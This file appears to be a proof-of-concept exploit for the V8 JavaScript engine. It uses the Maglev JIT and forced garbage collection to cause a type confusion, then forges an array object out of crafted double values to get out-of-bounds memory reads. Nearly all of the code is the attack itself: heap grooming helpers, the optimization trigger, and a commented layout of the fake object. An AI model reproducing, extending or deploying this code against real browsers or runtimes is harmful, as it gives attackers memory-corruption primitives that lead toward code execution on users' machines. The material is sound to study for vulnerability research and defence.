class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
    	while(1) {
    	}
    }
}
var helper = new Helpers();



function f(a) {
    let phi = a ? 0 : 4.2;
    phi |= 0;
    a.c = phi;
}
let obj = { c: "a" };
var fake_object_array;
helper.mark_sweep_gc();
helper.mark_sweep_gc();
% PrepareFunctionForOptimization(f);
f(obj);
% OptimizeMaglevOnNextCall(f);
f(obj);

new Array(256);

helper.scavenge_gc();
helper.mark_sweep_gc();

/*
low -> hight
00000000 00000000 | 00000000 00000000 | 0000 0018e979[double-array-map] | 00000219[properties] 00042149[element] | 00060000[length 0x30000] 00060000[useless]
*/
fake_object_array = [0.0, 0.0, 3.4644403541910054e-308, 5.743499907618807e-309, 8.34402697134475e-309];

// %DebugPrint(fake_object_array);
//%DebugPrint(obj);
fake_array = obj.c; // length 196608
%DebugPrint(fake_array);
console.log("[+] fake_array.length: ", fake_array.length);
console.log("[+] oob fake_array[200]: ", fake_array[200]);
helper.trap();